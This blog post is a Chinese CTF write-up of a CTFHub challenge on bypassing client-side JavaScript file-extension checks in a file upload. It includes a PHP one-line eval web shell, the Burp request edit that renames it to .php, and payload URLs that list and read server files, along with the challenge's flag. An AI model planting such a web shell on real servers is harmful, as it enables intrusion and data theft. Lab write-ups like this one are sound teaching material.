---
layout: post
title: "CTFHub 文件上传 - JS前端验证"
date: 2026-10-17
categories: ctfhub
tags: [ctfhub,web,文件上传,js前端校验,bypass]
permalink: /ctfhub/upload-js-check.html
---

# CTFHub 文件上传 - JS前端验证
## 一、题目信息
平台：CTFHub
分类：Web - 文件上传
题目名称：JS前端验证
难度：简单
Flag：`ctfhub{c2c14af80311cc5e0b251995}`

## 二、考点
1. 前端JavaScript校验文件后缀，仅在浏览器本地做限制，后端无校验
2. Burp Suite抓包修改请求数据包绕过前端限制
3. PHP一句话木马基础利用
4. `highlight_file`读取服务器文件源码获取flag

## 三、题目内容
页面提供文件上传表单，选择文件提交时，前端JS会校验文件后缀，**不允许直接上传.php文件**，只能上传jpg/png/gif等图片格式。前端校验可以被客户端篡改绕过。

## 四、解题步骤
1. 编写PHP一句话木马：`<?php @eval($_GET['cmd']);?>`，保存文件命名为`shell.jpg`，用jpg后缀通过前端JS校验。
2. 打开Burp Suite，开启代理抓包，在页面上传`shell.jpg`文件并点击Submit提交。
3. 在Burp抓到的上传POST数据包中，找到文件字段：
`Content-Disposition: form-data; name="file"; filename="shell.jpg"`
将`filename="shell.jpg"`修改为`filename="shell.php"`，修改完成后转发数据包。
4. 页面返回上传成功，文件路径：`upload/shell.php`，PHP木马成功上传到服务器。
5. 访问木马地址，传入cmd参数，使用`scandir`列出网站根目录文件：
`http://靶场地址/upload/shell.php?cmd=print_r(scandir('/var/www/html'));`
页面返回目录列表，发现flag文件`flag_169488260.php`。
6. 使用`highlight_file`读取flag文件源码，构造Payload：
`http://靶场地址/upload/shell.php?cmd=highlight_file('/var/www/html/flag_169488260.php');`
访问链接，页面输出源码，提取得到flag。

## 五、知识点解析
1. JS前端校验：校验代码运行在用户浏览器，仅用来提升用户体验，**不能作为安全防护**。用户可以通过抓包篡改请求绕过，不能依靠前端过滤保护服务。
2. 文件上传漏洞成因：后端没有二次校验文件后缀、文件内容，直接使用数据包内的filename保存文件。
3. 一句话木马：`eval()`执行传入的PHP代码，配合GET传参`cmd`，可以调用各类文件读取函数。
4. `highlight_file()`：PHP内置函数，读取文件并高亮输出源码，适合读取php格式的flag文件，相比file_get_contents输出更稳定。

## 六、总结
本题属于最简单的文件上传题型，核心思路：**前端限制都是虚的，所有安全校验必须放在后端**。
前端JS只是浏览器层面的检查，抓包修改数据包里的文件名，就能直接绕过限制上传PHP脚本，最后通过一句话木马读取服务器文件拿到flag。
